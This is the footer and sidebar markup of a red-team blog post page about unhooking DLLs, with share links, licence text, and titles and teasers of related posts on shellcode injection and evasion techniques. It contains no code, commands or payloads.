class="post-tag no-text-decoration" >Red Team</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=Staying+Under+the+Radar+-+Part+3+-+Unhooking+DLLs+-+Crypt0ace&url=https%3A%2F%2Fcrypt0ace.github.io%2Fposts%2FStaying-under-the-Radar-Part-3%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=Staying+Under+the+Radar+-+Part+3+-+Unhooking+DLLs+-+Crypt0ace&u=https%3A%2F%2Fcrypt0ace.github.io%2Fposts%2FStaying-under-the-Radar-Part-3%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Fcrypt0ace.github.io%2Fposts%2FStaying-under-the-Radar-Part-3%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/NHA-Part-3/">AD Pwnage: Ninja Hackers Academy Part 3</a><li><a href="/posts/NHA-Part-2/">AD Pwnage: Ninja Hackers Academy Part 2</a><li><a href="/posts/Using-DInvoke-For-Offensive-Tool-Development/">Using D/Invoke for Offensive Tool Development in C#</a><li><a href="/posts/Staying-under-the-Radar-Part-2/">Staying Under the Radar - Part 2 - Hiding IAT using Delegates</a><li><a href="/posts/Shellcode-Injection-Techniques/">Shellcode Injection in C# - Part 1 - Process Injection</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/red-team/">Red Team</a> <a class="post-tag" href="/tags/write-ups/">Write-Ups</a> <a class="post-tag" href="/tags/funbox-series/">Funbox Series</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/Shellcode-Injection-Techniques-Part-2/"><div class="card-body"> <em class="small" data-ts="1662663600" data-df="ll" > Sep 9, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Shellcode Injection in C# - Part 2 - Process Hollowing</h3><div class="text-muted small"><p> Introduction This post is part 2 of shellcode injection techniques. You can read part 1 here. In this one, we will look into Process Hollowing in C#. Process Hollowing Process Hollowing is a techn...</p></div></div></a></div><div class="card"> <a href="/posts/Shellcode-Injection-Techniques-Part-3/"><div class="card-body"> <em class="small" data-ts="1663268400" data-df="ll" > Sep 16, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Shellcode Injection in C# - Part 3 - QueueUserAPC | EarlyBird</h3><div class="text-muted small"><p> Introduction In this post we are going to look at another method for shellcode execution. THis involves using the API call QueueUserAPC. Like previous Process Hollowing, in this we are going to ope...</p></div></div></a></div><div class="card"> <a href="/posts/Staying-under-the-Radar/"><div class="card-body"> <em class="small" data-ts="1663441200" data-df="ll" > Sep 18, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>Staying Under the Radar - Part 1 - PPID Spoofing and Blocking DLLs</h3><div class="text-muted small"><p> Introduction In this post we are going to look at two “features” (lol) that Microsoft provided which can allow us to spoof our parent process ID and also block third party DLLs that are not Microso...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/Staying-under-the-Radar-Part-2/" class="btn btn-outline-primary" prompt="Older"><p>Staying Under the Radar - Part 2 - Hiding IAT using Delegates</p></a> <a href="/posts/Using-DInvoke-For-Offensive-Tool-Development/" class="btn btn-outline-primary" prompt="Newer"><p>Using D/Invoke for Offensive Tool Development in C#</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://twitter.com/crypt0acee">Ahmed Sher</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/red-team/">Red Team</a> <a class="post-tag" href="/tags/write-ups/">Write-Ups</a> <a class="post-tag" href="/tags/funbox-series/">Funbox Series</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
